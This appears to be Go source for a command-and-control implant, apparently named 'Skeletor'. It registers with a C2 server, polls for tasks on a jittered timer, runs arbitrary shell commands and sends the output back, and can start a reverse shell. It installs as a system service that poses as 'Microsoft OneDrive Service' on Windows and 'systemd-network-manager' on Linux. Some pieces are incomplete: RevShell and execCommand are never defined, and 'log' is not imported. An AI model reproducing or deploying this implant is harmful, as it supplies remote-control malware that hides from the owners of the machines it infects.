package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand/v2"
	"net"
	"net/http"
	"os/exec"
	"runtime"
	"strings"
	"time"
	"github.com/kardianos/service"
)

type program struct{}

type Agent struct {
	LocalIP          string
	ServerIP         string
	ServerPort       int
	CallbackInterval int
	Jitter           int
	Debug            bool
	Client           *http.Client
}

type Task struct {
	Action string      `json:"action"`
	Input  string      `json:"input"`
	Input2 string      `json:"input2"`
	TaskID json.Number `json:"task_id"`
}

type Result struct {
	AgentID    string `json:"agent_id"`
	TaskID     string `json:"task_id"`
	Result     string `json:"result"`
	ReturnCode int    `json:"returncode"`
}

func getLocalIP() string {
	if runtime.GOOS == "linux" {
		cmd := exec.Command("bash", "-c", "hostname -I | awk '{print $1}'")
		out, err := cmd.Output()
		if err != nil {
			return "?.?.?.?" // Fallback if command fails
		}
		return strings.TrimSpace(string(out))
	} else {
		addrs, err := net.InterfaceAddrs()
		if err != nil {
			return "?.?.?.?"
		}
		for _, address := range addrs {
			// makes sure to filter out loopback addresses
			if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					return ipnet.IP.String()
				}
			}
		}
		return "?.?.?.?"
	}
}

func (agent *Agent) Register() error {
	data := map[string]string{
		"agent_id":     agent.LocalIP,
		"os":           runtime.GOOS,
		"implant_type": "Go",
	}
	jsonData, err := json.Marshal(data)
	if err != nil {
		return fmt.Errorf("failed to marshal JSON: %w", err)
	}
	req, err := http.NewRequest("POST", fmt.Sprintf("http://%s:%d/register", agent.ServerIP, agent.ServerPort), bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := agent.Client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 201 && resp.StatusCode != 200 {
		return fmt.Errorf("unexpected status code: %d", resp.StatusCode)
	}
	return nil
}

func (agent *Agent) HandleTask(task Task) (Result, error) {
	var result Result
	result.AgentID = agent.LocalIP
	result.TaskID = task.TaskID.String()

	switch task.Action {
	case "command":
		cmd := execCommand(task.Input)
		out, err := cmd.CombinedOutput()
		if err != nil {
			result.Result = string(bytes.ToValidUTF8(out, []byte("?")))
			result.ReturnCode = cmd.ProcessState.ExitCode()
		} else {
			result.Result = string(out)
			result.ReturnCode = 0
		}
	case "shell":
		go RevShell(task.Input)
		result.Result = "Interactive shell started in background"
		result.ReturnCode = 0
	default:
		return result, fmt.Errorf("Undefined action in JSON: %s", task.Action)
	}
	if agent.Debug {
		fmt.Printf("Result: %s", result.Result)
	}
	return result, nil
}

func (agent *Agent) Sleep() {
	minSleep := agent.CallbackInterval - agent.Jitter
	if minSleep <= 0 {
		minSleep = 1
	}
	maxSleep := agent.CallbackInterval + agent.Jitter

	sleepTime := rand.IntN(maxSleep-minSleep+1) + minSleep //random sleep time between min and max sleep time
	if agent.Debug {
		fmt.Printf("Sleeping for %d seconds...\n", sleepTime)
	}
	time.Sleep(time.Duration(sleepTime) * time.Second)
}

func (p *program) Start(s service.Service) error {
    // Start the "real" work in a goroutine so this returns immediately
    go p.run()
    return nil
}

func (p *program) run() {
    agent := Agent{
		LocalIP:          getLocalIP(),
		ServerIP:         "127.0.0.1",
		ServerPort:       80,
		CallbackInterval: 15,
		Jitter:           5,
		Debug:            true,
		Client: &http.Client{
			Timeout: 10 * time.Second,
		},
	}

	// Attempt to register the agent with C2 server until successful
	for {
		err := agent.Register()
		if err != nil {
			if agent.Debug {
				fmt.Println("Error registering agent:", err)
			}
			agent.Sleep()
			continue
		}
		break
	}

	// Main loop to poll server for tasks
	for {
		url := fmt.Sprintf("http://%s:%d/tasks", agent.ServerIP, agent.ServerPort)
		ip_json := map[string]string{"agent_id": agent.LocalIP}
		jsonData, err := json.Marshal(ip_json)
		if err != nil {
			fmt.Println("Error marshaling JSON:", err)
			agent.Sleep()
			continue
		}
		req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
		if err != nil {
			if agent.Debug {
				fmt.Println("Error creating request:", err)
			}
			agent.Sleep()
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		resp, err := agent.Client.Do(req)
		if err != nil {
			if agent.Debug {
				fmt.Println("Error sending request:", err)
			}
			agent.Sleep()
			continue
		}
		if resp.StatusCode == 418 {
			agent.Register()
			continue
		}
		if resp.StatusCode != 200 && resp.StatusCode != 201 && resp.StatusCode != 204 {
			if agent.Debug {
				fmt.Printf("Unexpected status code: %d\n", resp.StatusCode)
			}
			agent.Sleep()
			continue
		} else if resp.StatusCode == 204 {
			// No tasks
			agent.Sleep()
			continue
		}

		var task Task
		err = json.NewDecoder(resp.Body).Decode(&task)
		if err != nil {
			if agent.Debug {
				fmt.Println("Error decoding JSON:", err)
			}
			agent.Sleep()
			continue
		}
		result, err := agent.HandleTask(task)
		if err != nil {
			if agent.Debug {
				fmt.Println("Error handling task:", err)
			}
			agent.Sleep()
			continue
		}
		// Send the result back to the server
		url = fmt.Sprintf("http://%s:%d/results", agent.ServerIP, agent.ServerPort)
		jsonData, err = json.Marshal(result)
		if err != nil {
			if agent.Debug {
				fmt.Println("Error marshaling JSON:", err)
			}
			agent.Sleep()
			continue
		}
		req, err = http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
		if err != nil {
			if agent.Debug {
				fmt.Println("Error creating request:", err)
			}
			agent.Sleep()
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		resp, err = agent.Client.Do(req)
		if err != nil {
			if agent.Debug {
				fmt.Println("Error sending request:", err)
			}
			agent.Sleep()
			continue
		}
		if resp.StatusCode != 200 && resp.StatusCode != 201 && resp.StatusCode != 204 {
			if agent.Debug {
				fmt.Printf("Unexpected status code: %d\n", resp.StatusCode)
			}
			agent.Sleep()
			continue
		}
	}
}

func (p *program) Stop(s service.Service) error {
    // Cleanup logic here
    return nil
}

func main() {
	svcConfig := &service.Config{
        Name: "Skeletor-Service", // Fallback name
    }
    switch runtime.GOOS {
    case "windows":
        svcConfig.Name = "OneDrive"
		svcConfig.DisplayName = "Microsoft OneDrive Service"
		svcConfig.Description = "Provides cloud file synchronization and backup services."
    case "linux":
        svcConfig.Name = "systemd-network-manager"
        svcConfig.DisplayName = "Systemd Network Manager Service"
        svcConfig.Description = "Systemd Network Manager Service"
    case "freebsd":
        svcConfig.Name = "bsd-watcher"
        svcConfig.DisplayName = "FreeBSD Watcher"
        svcConfig.Description = "Monitoring daemon for FreeBSD systems."
    }
    prg := &program{}
    s, err := service.New(prg, svcConfig)
	if err != nil {
        log.Fatal(err)
    }
    s.Run()
}
